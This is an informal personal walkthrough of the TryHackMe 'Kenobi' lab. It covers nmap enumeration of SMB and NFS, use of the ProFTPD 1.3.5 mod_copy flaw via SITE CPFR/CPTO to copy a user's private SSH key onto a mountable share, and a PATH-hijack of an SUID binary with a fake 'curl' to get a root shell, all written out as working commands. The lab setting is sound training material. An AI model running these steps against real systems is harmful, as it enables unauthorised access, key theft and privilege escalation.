1. scan the network as normal. http server is a trick nothing is there
2.  on 445 samba was running.  to enumerate samba more we can use nmap scripts. like the following command
_nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP_
in this scenario could find three samba shares. hidden share, anonymous and print.  i dont know what is anonymous share but i guess it allows to access by anyone.may be im dumb. smbclient can be used to access those shares.
_smbclient //ip/anonymous_
to download the file in it we can either use 'get' command or this
_smbget -R smb://ip/anonymous_

3. i have no idea of rpcbind. but i think it has some thing to do with nfs(network file system). so as the above nmap can be used to enumerate the rpcbind or nfs whatever
_nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.84.55_
so it show we can see /var directory as a mount(i don't know what is mount. it was in thm)

4. now we are going for ftp service. to listen to the ftp service we can use netcat like this.
_nc ipofserver 21_ 
now we got the version as proftpd 1.3.5. so thm says to try to find exploits in there. it suggest about 'exploit-db' and says searchsploit command can access the db
_searchsploit proftpd 1.3.5_ 
now this shows 4 exploits. 
by the way we can access ftp server using this
_ftp ipaddress_
now we are going to use that mode_copy exploit. first listen using netcat. then copy and past private ssh key in to the path where mount thing can do. 
_nc 10.10.84.55 21_
_SITE CPFR /home/kenobi/.ssh/id_rsa_
_SITE CPTO /var/tmp/id_rsa_

5. now private key for ssh is in var direcotory. since it can mount now we can mount it and go through it to find the private key.
dont know anything about this mnt directory but it worked first time.second time it worked to the path where i created. maybe im idiot.just do these.
_mkdir mnt/kenobi_
_mount 10.10.84.55:/var /mnt/kenobi_
_ls -al /mnt/kenobi_
now we can see whole nfs(network file system) in there. now go to tmp and copy and paste private key in somewhere else. change the permission if you want before using it. 

by the way all those info about private key could be find because of that samba shared log file. 

6.  now we have gained access. now try to find suid files using find command. first one is my method. 
_find / -perm /4000 2>/dev/null_
_find / -perm -u=s -type f 2>/dev/null_

john hammond said /usr/bin/menu is suspicious. i have no idea. he is a genius. so file command showed it is a binary file. because it has SUID permission we know what ever inside it run as root.
_file /usr/bin/menu_
then we could find some of the program code by using strings command. strings is also can be usefull in stegonagraphy.sorry about my english. future me u better have find some job. 
_strings /usr/bin/menu_
by the way when we run /usr/bin/menu binary file it gave us three options. in string command could find the "curl -I localhost". for the record i know -I in curl give header info and first option in binary file also gave some heder info. so first option run that curl command.
now what we do.
now we create a curl file in our directory and make it to run the bash shell. then we can change path variable so when ever this run (/usr/bin/menu) the curl in it run the curl in our directory. 
yeah i know just look at the code
_echo /bin/bash > curl_  -- /bin/sh also worked
_chmod +x curl_ -- make the permission otherwise it wont run
echo $PATH -- this shows the path variable. i have no idea what it is
export PATH=/dev/shm:$PATH -- this change the path variable to inour path /dev/shm
now just run the program and select option one. it will run as curl in our path and will give bash shell with root permission
_/usr/bin/menu_

i dont have any idea but its 2022/11/04 and im jobless and future is dark.

